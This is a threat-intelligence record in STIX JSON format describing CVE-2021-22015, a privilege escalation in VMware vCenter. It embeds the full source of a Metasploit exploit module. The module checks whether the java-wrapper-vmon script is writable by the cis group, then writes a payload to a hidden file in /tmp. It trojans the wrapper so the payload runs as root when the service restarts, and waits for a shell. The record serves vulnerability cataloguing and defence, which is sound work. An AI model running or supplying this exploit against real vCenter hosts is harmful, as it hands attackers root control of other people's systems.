{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e96df64d-e7f1-4581-b029-d846793cecac",
    "created": "2024-08-14T16:59:07.619885Z",
    "modified": "2024-08-14T16:59:07.619889Z",
    "name": "VMware vCenter vScalation Priv Esc",
    "description": " This module exploits a privilege escalation in vSphere/vCenter due to improper permissions on the /usr/lib/vmware-vmon/java-wrapper-vmon file. It is possible for anyone in the cis group to write to the file, which will execute as root on vmware-vmon service restart or host reboot.  This module was successfully tested against VMware VirtualCenter 6.5.0 build-7070488. The following versions should be vulnerable: vCenter 7.0 before U2c vCenter 6.7 before U3o vCenter 6.5 before U3q  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/vcenter_java_wrapper_vmon_priv_esc.rb",
            "external_id": "vcenter_java_wrapper_vmon_priv_esc.rb"
        },
        {
            "source_name": "reference",
            "url": "https://pentera.io/blog/vscalation-cve-2021-22015-local-privilege-escalation-in-vmware-vcenter-pentera-labs/"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-22015"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2021-0020.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ManualRanking\n\n  include Msf::Post::Linux::Priv\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'VMware vCenter vScalation Priv Esc',\n        'Description' => %q{\n          This module exploits a privilege escalation in vSphere/vCenter due to improper permissions on the\n          /usr/lib/vmware-vmon/java-wrapper-vmon file. It is possible for anyone in the\n          cis group to write to the file, which will execute as root on vmware-vmon service\n          restart or host reboot.\n\n          This module was successfully tested against VMware VirtualCenter 6.5.0 build-7070488.\n          The following versions should be vulnerable:\n          vCenter 7.0 before U2c\n          vCenter 6.7 before U3o\n          vCenter 6.5 before U3q\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Yuval Lazar' # original PoC, analysis\n        ],\n        'Platform' => [ 'linux' ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Targets' => [[ 'Auto', {} ]],\n        'Privileged' => true,\n        'References' => [\n          [ 'URL', 'https://pentera.io/blog/vscalation-cve-2021-22015-local-privilege-escalation-in-vmware-vcenter-pentera-labs/' ],\n          [ 'CVE', '2021-22015' ],\n          [ 'URL', 'https://www.vmware.com/security/advisories/VMSA-2021-0020.html' ]\n        ],\n        'DisclosureDate' => '2021-09-21',\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'WfsDelay' => 1800 # 30min\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SERVICE_DOWN],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES, IOC_IN_LOGS],\n          'AKA' => ['vScalation']\n        }\n      )\n    )\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  # Simplify pulling the writable directory variable\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def java_wrapper_vmon\n    '/usr/lib/vmware-vmon/java-wrapper-vmon'\n  end\n\n  def check\n    group_owner = cmd_exec(\"stat -c \\\"%G\\\" \\\"#{java_wrapper_vmon}\\\"\")\n    if writable?(java_wrapper_vmon) && group_owner == 'cis'\n      return CheckCode::Appears(\"#{java_wrapper_vmon} is writable and owned by cis group\")\n    end\n\n    CheckCode::Safe(\"#{java_wrapper_vmon} not owned by 'cis' group (owned by '#{group_owner}'), or not writable\")\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    # Make sure we can write our exploit and payload to the local system\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    # backup the original file\n    @backup = read_file(java_wrapper_vmon)\n    path = store_loot(\n      'java-wrapper-vmon.text',\n      'text/plain',\n      rhost,\n      @backup,\n      'java-wrapper-vmon.text'\n    )\n    print_good(\"Original #{java_wrapper_vmon} backed up to #{path}\")\n\n    # Upload payload executable\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n    print_status(\"Writing payload to #{payload_path}\")\n    upload_and_chmodx payload_path, generate_payload_exe\n    register_files_for_cleanup payload_path\n\n    # write trojaned file\n    # we want to write our payload towards the top to ensure it gets run\n    # writing it at the bottom of the file results in the payload not being run\n    print_status(\"Writing trojaned #{java_wrapper_vmon}\")\n    write_file(java_wrapper_vmon, @backup.gsub('#!/bin/sh', \"#!/bin/sh\\n#{payload_path} &\\n\"))\n\n    # try to restart the service\n    print_status('Attempting to restart vmware-vmon service (systemctl restart vmware-vmon.service)')\n    service_restart = cmd_exec('systemctl restart vmware-vmon.service')\n    # one error i'm seeing when using vsphere-client is: Failed to restart vmware-vmon.service: The name org.freedesktop.PolicyKit1 was not provided by any .service files\n    if service_restart.downcase.include?('access denied') || service_restart.downcase.include?('failed')\n      print_bad('vmware-vmon service needs to be restarted, or host rebooted to obtain shell.')\n    end\n    print_status(\"Waiting #{datastore['WfsDelay']} seconds for shell\")\n  end\n\n  def cleanup\n    unless @backup.nil?\n      print_status(\"Replacing trojaned #{java_wrapper_vmon} with original\")\n      write_file(java_wrapper_vmon, @backup)\n    end\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-09-21",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}